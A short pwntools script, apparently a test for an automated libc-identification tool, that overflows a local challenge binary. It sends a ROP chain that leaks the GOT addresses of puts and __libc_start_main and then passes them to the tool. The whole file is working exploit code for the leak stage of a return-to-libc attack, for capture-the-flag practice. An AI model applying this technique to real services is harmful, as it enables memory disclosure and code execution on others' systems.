from pwn import *

import TheNight

import time

import sys

target = process("./chall-test_localLibcId-1-x64")
payload = ""
payload += "000000000000000000000000000000000000000000000000000000000000000000000000"
payload += p64(0x401203)
payload += p64(0x404018)
payload += p64(0x401050)
payload += p64(0x401203)
payload += p64(0x403ff0)
payload += p64(0x401050)
target.sendline(payload)
leak = target.recvuntil("\n").strip("\n")
gotAddress0 = u64(leak + "\x00"*(8-len(leak)))
leak = target.recvuntil("\n").strip("\n")
gotAddress1 = u64(leak + "\x00"*(8-len(leak)))
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
